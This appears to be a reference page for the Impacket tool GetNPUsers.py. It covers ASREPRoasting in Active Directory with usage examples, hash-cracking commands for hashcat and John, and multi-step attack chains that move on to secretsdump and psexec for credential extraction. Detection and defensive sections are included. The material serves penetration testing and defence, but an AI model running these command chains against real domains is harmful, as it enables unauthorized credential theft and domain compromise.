# GetNPUsers.py

## Overview
`GetNPUsers.py` implements the ASREPRoast attack, which targets user accounts that have Kerberos pre-authentication disabled. This attack allows extracting password hashes for offline cracking without requiring valid credentials.

## Detailed Description
The ASREPRoast attack exploits user accounts configured with "Do not require Kerberos preauthentication" setting. When pre-authentication is disabled, an attacker can request authentication for these users and receive an AS-REP response containing encrypted data that can be cracked offline to recover the user's password.

### Key Features:
- Enumerate users with pre-authentication disabled
- Extract AS-REP hashes for offline cracking
- Support for username lists and single users
- Multiple output formats (John, Hashcat)
- Domain controller enumeration
- No authentication required for basic enumeration

### Technical Details:
- Exploits KRB_AS_REQ/KRB_AS_REP exchange
- Targets accounts with `DONT_REQUIRE_PREAUTH` flag
- Encrypted timestamp in AS-REP can be cracked
- Uses Kerberos protocol over UDP/TCP port 88

## Command Line Options

```
usage: GetNPUsers.py [-h] [-request] [-outputfile OUTPUTFILE] 
                     [-format {hashcat,john}] [-usersfile USERSFILE]
                     [-dc-ip DC_IP] [-dc-host DC_HOST] [-debug]
                     [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key]
                     target

Required Arguments:
  target                Domain/username or just domain for user enumeration

Optional Arguments:
  -request              Request AS-REP hashes for users
  -outputfile           Output file for hashes
  -format               Hash output format (hashcat or john)
  -usersfile            File containing usernames to check
  -dc-ip                Domain controller IP address
  -dc-host              Domain controller hostname
  -debug                Enable debug output

Authentication (for user enumeration):
  -hashes               NTLM hashes (LM:NT)
  -no-pass              Don't ask for password
  -k                    Use Kerberos authentication
  -aesKey               AES key for Kerberos authentication
```

## Usage Examples

### Basic ASREPRoast Attack
```bash
# Check for ASREPRoastable users without authentication
python3 GetNPUsers.py domain.com/ -dc-ip 192.168.1.10

# Request hashes for specific user
python3 GetNPUsers.py domain.com/testuser -dc-ip 192.168.1.10 -request

# Request hashes and save to file
python3 GetNPUsers.py domain.com/ -dc-ip 192.168.1.10 -request -outputfile asrep_hashes.txt
```

### Using Username Lists
```bash
# Check usernames from file
python3 GetNPUsers.py domain.com/ -usersfile users.txt -dc-ip 192.168.1.10 -request

# Format output for hashcat
python3 GetNPUsers.py domain.com/ -usersfile users.txt -dc-ip 192.168.1.10 -request -format hashcat
```

### Authenticated Enumeration
```bash
# Use valid credentials to enumerate all ASREPRoastable users
python3 GetNPUsers.py domain.com/user:password -dc-ip 192.168.1.10 -request

# Use NTLM hash authentication
python3 GetNPUsers.py domain.com/user -hashes :ntlmhash -dc-ip 192.168.1.10 -request

# Use Kerberos authentication
python3 GetNPUsers.py domain.com/user -k -dc-ip 192.168.1.10 -request
```

### Advanced Usage
```bash
# Output in John the Ripper format
python3 GetNPUsers.py domain.com/ -dc-ip 192.168.1.10 -request -format john -outputfile john_hashes.txt

# Enable debug mode for troubleshooting
python3 GetNPUsers.py domain.com/ -dc-ip 192.168.1.10 -request -debug
```

## Attack Chain Integration

### Initial Domain Enumeration
```bash
# Step 1: Discover domain controllers
nmap -p 88 192.168.1.0/24

# Step 2: Enumerate ASREPRoastable users
python3 GetNPUsers.py domain.com/ -dc-ip 192.168.1.10 -request -outputfile asrep.hash

# Step 3: Crack obtained hashes
hashcat -m 18200 asrep.hash wordlists/rockyou.txt

# Step 4: Use cracked credentials for further attacks
python3 secretsdump.py domain.com/cracked_user:password@dc.domain.com
```

### User Enumeration Chain
```bash
# Step 1: Get valid user list via LDAP
python3 GetADUsers.py domain.com/user:password -dc-ip 192.168.1.10 -all

# Step 2: Check users for ASREPRoast
python3 GetNPUsers.py domain.com/user:password -dc-ip 192.168.1.10 -request

# Step 3: Also check for Kerberoasting
python3 GetUserSPNs.py domain.com/user:password -dc-ip 192.168.1.10 -request
```

### Post-Exploitation Enhancement
```bash
# Step 1: Gain initial access
python3 psexec.py domain.com/user:password@target.domain.com

# Step 2: Extract cached credentials
python3 secretsdump.py domain.com/user:password@target.domain.com

# Step 3: Use extracted credentials for ASREPRoast
python3 GetNPUsers.py domain.com/extracted_user:password -dc-ip 192.168.1.10 -request
```

## Hash Cracking

### Hashcat Usage
```bash
# Crack AS-REP hashes with hashcat
hashcat -m 18200 asrep_hashes.txt wordlist.txt

# Use rules for better cracking
hashcat -m 18200 asrep_hashes.txt wordlist.txt -r rules/best64.rule

# Brute force attack
hashcat -m 18200 asrep_hashes.txt -a 3 ?u?l?l?l?l?l?d?d
```

### John the Ripper Usage
```bash
# Crack with John the Ripper
john --wordlist=wordlist.txt asrep_hashes.txt

# Show cracked passwords
john --show asrep_hashes.txt
```

## Target Identification

### Finding ASREPRoast Targets
```powershell
# PowerShell command to find users with pre-auth disabled
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
```

```bash
# LDAP search for vulnerable users
ldapsearch -H ldap://dc.domain.com -D "user@domain.com" -w password \
  -b "DC=domain,DC=com" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" samaccountname
```

## Prerequisites
- Network access to domain controller (port 88)
- Knowledge of domain name
- Optional: Valid domain credentials for enhanced enumeration
- Username list for targeted attacks

## Detection Considerations
- **Event ID 4768**: Kerberos authentication ticket (TGT) was requested
- **Event ID 4771**: Kerberos pre-authentication failed
- **Unusual Patterns**: Multiple AS-REQ requests for users without pre-auth
- **Network Indicators**: High volume of Kerberos traffic to DC
- **Failed Authentication**: AS-REQ requests without proper pre-authentication

## Defensive Measures
- **Enable Pre-authentication**: Ensure all accounts have Kerberos pre-authentication enabled
- **Account Auditing**: Regular audit of accounts with `DONT_REQUIRE_PREAUTH` flag
- **Strong Passwords**: Enforce strong password policies to resist cracking
- **Monitoring**: Implement monitoring for unusual Kerberos authentication patterns
- **Honeypots**: Create honeypot accounts with pre-auth disabled to detect attacks
- **Network Segmentation**: Limit access to domain controllers

## Common Errors and Troubleshooting

### Clock Skew Issues
```bash
# Sync time with domain controller
ntpdate dc.domain.com

# Or use chrony
chrony sources -v
```

### Network Connectivity
```bash
# Test Kerberos port connectivity
nc -zv dc.domain.com 88

# Test UDP connectivity
nmap -sU -p 88 dc.domain.com
```

## Related Tools
- [GetUserSPNs.py](GetUserSPNs.md) - Kerberoasting attack (complementary technique)
- [GetADUsers.py](GetADUsers.md) - User enumeration for target identification
- [getTGT.py](getTGT.md) - Request TGTs with compromised credentials
- [ticketer.py](ticketer.md) - Create golden tickets with cracked credentials
- [secretsdump.py](secretsdump.md) - Extract more credentials after successful compromise
